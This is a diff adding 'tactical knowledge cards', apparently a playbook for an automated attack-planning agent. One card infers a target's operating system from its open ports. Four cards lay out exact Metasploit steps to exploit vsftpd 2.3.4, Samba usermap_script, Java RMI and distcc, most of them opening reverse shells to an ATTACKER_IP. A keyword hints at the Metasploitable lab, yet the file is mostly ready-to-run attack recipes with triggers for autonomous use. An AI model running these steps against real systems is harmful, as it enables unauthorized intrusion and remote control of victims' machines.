@@ -1,0 +1,118 @@
+
+=== TACTICAL KNOWLEDGE CARD ===
+NAME: manual/tactic/os_fingerprinting_by_port
+TYPE: strategy
+KEYWORDS: recon os detection windows linux unix port mapping
+DESCRIPTION: How to guess the Operating System based on open ports.
+INSTRUCTIONS:
+IF Port 445 (SMB) is OPEN -> Target is likely WINDOWS.
+        IF Port 139 (NetBIOS) is OPEN -> Target is likely WINDOWS.
+        IF Port 3389 (RDP) is OPEN -> Target is likely WINDOWS.
+        IF Port 22 (SSH) is OPEN -> Target is likely LINUX or UNIX.
+        IF Port 111 (RPC) is OPEN -> Target is likely LINUX or UNIX.
+        IF Port 2049 (NFS) is OPEN -> Target is likely LINUX or UNIX.
+        
+        DECISION LOGIC:
+        - If targeting Windows ports, prioritize 'exploit/windows/...' modules.
+        - If targeting Linux ports, prioritize 'exploit/linux/...' or 'exploit/unix/...' modules.
+USAGE_NOTE: Apply this logic during the PLANNING phase to select the correct module based on OS and Port.
+===============================
+
+
+=== TACTICAL KNOWLEDGE CARD ===
+NAME: manual/tactic/attack_guide_ftp_vsftpd
+TYPE: strategy
+KEYWORDS: ftp port 21 vsftpd backdoor exploit guide
+DESCRIPTION: Tactical guide for attacking vsftpd 2.3.4 on Port 21.
+INSTRUCTIONS:
+TRIGGER: If Port 21 is OPEN and service banner contains "vsftpd 2.3.4".
+        RECOMMENDED MODULE: exploit/unix/ftp/vsftpd_234_backdoor
+        
+        CONFIGURATION STEPS:
+        1. use exploit/unix/ftp/vsftpd_234_backdoor
+        2. set RHOSTS <TARGET_IP>
+        3. set RPORT 21
+        4. set UNKNOWN_CONNECTION_ERROR true (optional, helps connectivity)
+        5. exploit
+        
+        NOTE: This module opens a shell instantly. No complex payload needed.
+USAGE_NOTE: Apply this logic during the PLANNING phase to select the correct module based on OS and Port.
+===============================
+
+
+=== TACTICAL KNOWLEDGE CARD ===
+NAME: manual/tactic/attack_guide_samba_usermap
+TYPE: strategy
+KEYWORDS: samba smb port 139 port 445 usermap script exploit guide linux
+DESCRIPTION: Tactical guide for attacking old Samba versions on Linux.
+INSTRUCTIONS:
+TRIGGER: If Port 139 or 445 is OPEN and OS seems to be Linux/Unix.
+        RECOMMENDED MODULE: exploit/multi/samba/usermap_script
+        
+        CONFIGURATION STEPS:
+        1. use exploit/multi/samba/usermap_script
+        2. set RHOSTS <TARGET_IP>
+        3. set RPORT 139 (or 445)
+        4. set LHOST <ATTACKER_IP>
+        5. set LPORT 4444
+        6. exploit
+USAGE_NOTE: Apply this logic during the PLANNING phase to select the correct module based on OS and Port.
+===============================
+
+
+=== TACTICAL KNOWLEDGE CARD ===
+NAME: manual/tactic/attack_guide_java_rmi
+TYPE: strategy
+KEYWORDS: java rmi port 1099 metasploitable exploit guide
+DESCRIPTION: Tactical guide for attacking Java RMI Server.
+INSTRUCTIONS:
+TRIGGER: If Port 1099 is OPEN.
+        RECOMMENDED MODULE: exploit/multi/misc/java_rmi_server
+        
+        CONFIGURATION STEPS:
+        1. use exploit/multi/misc/java_rmi_server
+        2. set RHOSTS <TARGET_IP>
+        3. set RPORT 1099
+        4. set LHOST <ATTACKER_IP>
+        5. set LPORT 4444
+        6. exploit
+USAGE_NOTE: Apply this logic during the PLANNING phase to select the correct module based on OS and Port.
+===============================
+
+
+=== TACTICAL KNOWLEDGE CARD ===
+NAME: manual/tactic/attack_guide_distcc
+TYPE: strategy
+KEYWORDS: distcc port 3632 compilation exploit guide
+DESCRIPTION: Tactical guide for attacking Distributed Compiler Daemon.
+INSTRUCTIONS:
+TRIGGER: If Port 3632 is OPEN.
+        RECOMMENDED MODULE: exploit/unix/misc/distcc_exec
+        
+        CONFIGURATION STEPS:
+        1. use exploit/unix/misc/distcc_exec
+        2. set RHOSTS <TARGET_IP>
+        3. set RPORT 3632
+        4. set LHOST <ATTACKER_IP>
+        5. set LPORT 4444
+        6. set PAYLOAD cmd/unix/reverse (often more stable)
+        7. exploit
+USAGE_NOTE: Apply this logic during the PLANNING phase to select the correct module based on OS and Port.
+===============================
+
+
+=== TACTICAL KNOWLEDGE CARD ===
+NAME: manual/tactic/general_module_selection_logic
+TYPE: strategy
+KEYWORDS: how to choose module matching logic
+DESCRIPTION: Rules for matching modules to targets.
+INSTRUCTIONS:
+1. OS MATCH: Never run a 'windows' exploit against a target with Port 22 (SSH) unless you are sure.
+        2. SERVICE MATCH: Check the port. Port 21 is FTP. Port 22 is SSH. Port 23 is Telnet. Port 80 is HTTP. Port 445 is SMB.
+        3. MODULE PATH: The path tells you the OS. 
+           - exploit/WINDOWS/... -> Only for Windows.
+           - exploit/LINUX/... -> Only for Linux.
+           - exploit/UNIX/... -> Generic Unix/Linux.
+           - exploit/MULTI/... -> Works on multiple OS (check options).
+USAGE_NOTE: Apply this logic during the PLANNING phase to select the correct module based on OS and Port.
+===============================
